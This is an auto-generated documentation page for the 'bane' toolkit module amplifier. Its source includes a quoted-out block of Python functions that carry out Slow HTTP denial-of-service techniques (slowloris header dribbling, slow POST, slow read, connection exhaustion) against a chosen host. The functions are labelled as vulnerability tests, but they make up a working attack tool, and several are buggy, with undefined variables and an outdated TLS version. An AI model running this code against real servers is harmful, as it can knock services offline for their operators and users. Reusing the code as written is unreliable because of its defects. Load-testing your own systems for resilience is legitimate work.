<body>
<main>
<article id="content">
<header>
<h1 class="title">Module <code>bane.scanners.network_protocols.amplifier</code></h1>
</header>
<section id="section-intro">
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">from bane.scanners.network_protocols.chargen import *
from bane.scanners.network_protocols.dns import *
from bane.scanners.network_protocols.echo import *
from bane.scanners.network_protocols.memcache import *
from bane.scanners.network_protocols.ntp import *
from bane.scanners.network_protocols.snmp import *
from bane.scanners.network_protocols.ssdp import *


&#34;&#34;&#34;
&#39;&#39;&#39;
  the following functions are used to check any kind of Slow HTTP attacks vulnerabilities that will lead to a possible DoS.
&#39;&#39;&#39;

def build_get(u,p,timeout=5):
    s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,p))
    if ((p==443 ) or (p==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    s.send(&#34;GET {} HTTP/1.1\r\n&#34;.format(random.choice(paths)).encode(&#34;utf-8&#34;))
    s.send(&#34;User-Agent: {}\r\n&#34;.format(random.choice(ua)).encode(&#34;utf-8&#34;))
    s.send(&#34;Accept-language: en-US,en,q=0.5\r\n&#34;.encode(&#34;utf-8&#34;))
    s.send(&#34;Connection: keep-alive\r\n&#34;.encode(&#34;utf-8&#34;))
    return s

def headers_timeout_test(u,port=80,timeout=5,max_timeout=30,logs=True):
 i=0
 if logs==True:
  print(&#34;[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nMax interval: {}&#34;.format(u,port,timeout,max_timeout))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print(&#34;[-]Connection failed&#34;)
  return 0
 if i&gt;0:
  j=0
  while True:
   try:
    j+=1
    if j&gt;max_timeout:
     break
    if logs==True:
     print(&#34;[*]Sending payload...&#34;)
    s.send(&#34;X-a: {}\r\n&#34;.format(random.randint(1, 5000)).encode(&#34;utf-8&#34;))
    if logs==True:
     print(&#34;[+]Sleeping for {} seconds...&#34;.format(j))
    time.sleep(j)
   except:
    if logs==True:
     print(&#34;==&gt;timed out at: {} seconds&#34;.format(j))
     break
    return j
  if j&gt;max_timeout:
   if logs==True:
    print(&#34;==&gt;Test has reached the max interval: {} seconds without timing out&#34;.format(duration))
   return j

def slow_get_test(u,port=80,timeout=5,interval=5,randomly=False,duration=180,logs=True,min_wait=1,max_wait=5):
 i=0
 if logs==True:
  print(&#34;[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nInterval between packets:{}\nTest duration: {} seconds&#34;.format(u,port,timeout,interval,duration))
 try:
  s=build_get(u,port,timeout=timeout)
  i+=1
 except:
  if logs==True:
   print(&#34;[-]Connection failed&#34;)
  return 0
 if i&gt;0:
  j=time.time()
  while True:
   try:
    ti=time.time()
    if int(ti-j)&gt;=duration:
     break
    if logs==True:
     print(&#34;[*]Sending payload...&#34;)
    s.send(&#34;X-a: {}\r\n&#34;.format(random.randint(1, 5000)).encode(&#34;utf-8&#34;))
    t=interval
    if randomly==True:
     t=random.randint(min_wait,max_wait)
    if logs==True:
     print(&#34;[+]Sleeping for {} seconds...&#34;.format(t))
    time.sleep(t)
   except Exception as e:
    pass
    if logs==True:
     print(&#34;==&gt;timed out at: {} seconds&#34;.format(int(ti-j)))
    return int(ti-j)
    break
  if int(ti-j)&gt;=duration:
   if logs==True:
    print(&#34;==&gt;Test has reached the max interval: {} seconds without timing out&#34;.format(duration))
   return int(ti-j)

def max_connections_limit(u,port=80,connections=150,timeout=5,duration=180,logs=True,payloads=True):
 l=[]
 if logs==True:
  print(&#34;[*]Test has started:\nTarget: {}\nPort: {}\nConnections to create: {}\nInitial connection timeout: {}\nTest duration: {} seconds&#34;.format(u,port,connections,timeout,duration))
 ti=time.time()
 while True:
  if int(time.time()-ti)&gt;=duration:
   if logs==True:
    print(&#34;[+]Maximum time for test has been reached!!!&#34;)
    break
   return len(l)
  if len(l)==connections:
   if logs==True:
    print(&#34;[+]Maximum number of connections has been reached!!!&#34;)
   if returning==True:
    return connections 
   break
  try:
   so=build_get(u,port,timeout=timeout)
   l.append(so)
  except Exception as e:
   pass
  if payloads==True:
   for s in l:
    try:
     s.send(&#34;X-a: {}\r\n&#34;.format(random.randint(1, 5000)).encode(&#34;utf-8&#34;))
    except:
     l.remove(s)
  if logs==True:
   print(&#34;[!]Sockets: {} Time: {} seconds&#34;.format(len(l),int(time.time()-ti)))

def build_post(u,p,timeout=5,size=10000):
 s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(timeout)
 s.connect((u,p))
 if ((p==443 ) or (p==8443)):
  s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
 s.send(&#34;POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n&#34;.format(random.choice(paths),random.choice(ua),random.randint(300,1000),size,u).encode(&#34;utf-8&#34;))
 return s

def slow_post_test(u,port=80,logs=True,timeout=5,size=10000,duration=180,randomly=False,wait=1,min_wait=1,max_wait=5):
 i=0
 if logs==True:
  print(&#34;[*]Test has started:\nTarget: {}\nPort: {}\nData length to post: {}\nInitial connection timeout:{}\nTest duration: {} seconds&#34;.format(u,port,size,timeout,duration))
 try:
  s=build_post(u,port,timeout=timeout,size=size)
  i+=1
 except Exception as e:
  if logs==True:
   print(&#34;[-]Connection failed&#34;)
  return 0
 j=0
 if i&gt;0:
  t=time.time()
  while True:
   if int(time.time()-t)&gt;=duration:
    if logs==True:
     print(&#34;[+]Maximum time has been reached!!!\n==&gt;Size: {}\n==&gt;Time: {}&#34;.format(j,int(time.time()-t)))
    return int(time.time()-t)
   if j==size:
    if logs==True:
     print(&#34;[+]Maximum size has been reached!!!\n==&gt;Size: {}\n==&gt;Time: {}&#34;.format(j,int(time.time()-t)))
    return int(time.time()-t)
   try:
    h=random.choice(lis)
    s.send(h.encode(&#34;utf-8&#34;))
    j+=1
    if logs==True:
     print(&#34;Posted: {}&#34;.format(h))
    if randomly==True:
     time.sleep(random.randint(min_wait,max_wait))
    if randomly==False:
     try:
      time.sleep(wait)
     except KeyboardInterrupt:
      if logs==True:
       print(&#34;[-]Cant send more\n==&gt;Size: {}\n==&gt;Time:{}&#34;.format(j,int(time.time()-t)))
      return int(time.time()-t)
   except Exception as e:
    if logs==True:
     print(&#34;[-]Cant send more\n==&gt;Size: {}\n==&gt;Time:{}&#34;.format(j,int(time.time()-t)))
    return int(time.time()-t)

def slow_read_test(u,port=80,logs=True,timeout=5,duration=180,randomly=False,wait=5,min_wait=1,max_wait=10):
  i=0
  if logs==True:
   print(&#34;[*]Test has started:\nTarget: {}\nPort: {}\nInitial connection timeout: {}\nTest duration: {} seconds&#34;.format(u,port,timeout,duration))
  ti=time.time()
  try: 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((u,port))
    if ((port==443 ) or (port==8443)):
     s=ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
    while True:
     if time.time()-ti&gt;=duration:
      if logs==True:
       print(&#34;[+]Maximum time has been reached!!!&#34;)
      return int(time.time()-ti)
     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send(&#34;GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n&#34;.format(pa,random.choice(ua),random.randint(300,1000),u).encode(&#34;utf-8&#34;))
      else:
       q=&#39;q=&#39;
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send(&#34;POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}&#34;.format(pa,random.choice(ua),random.randint(300,1000),len(q),u,q).encode(&#34;utf-8&#34;))
      d=s.recv(random.randint(1,3))
      if logs==True:
       print(&#34;Received: {}&#34;.format(str(d.decode(&#39;utf-8&#39;))))
      print(&#34;sleeping...&#34;)
      if randomly==True:
       time.sleep(random.randint(min_wait,max_wait))
      if randomly==False:
       time.sleep(wait)
     except:
      break
    s.close()
  except Exception as e:
    pass
  if logs==True:
   print(&#34;==&gt;connection closed at: {} seconds&#34;.format(int(time.time()-ti)))
  return int(time.time()-ti)

&#34;&#34;&#34;</code></pre>
</details>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
<section>
</section>
</article>
<nav id="sidebar">
<h1>Index</h1>
<div class="toc">
<ul></ul>
</div>
<ul id="index">
<li><h3>Super-module</h3>
<ul>
<li><code><a title="bane.scanners.network_protocols" href="index.md">bane.scanners.network_protocols</a></code></li>
</ul>
</li>
</ul>
</nav>
</main>
<footer id="footer">
<p>Generated by <a href="https://pdoc3.github.io/pdoc" title="pdoc: Python API documentation generator"><cite>pdoc</cite> 0.10.0</a>.</p>
</footer>
</body>
</html>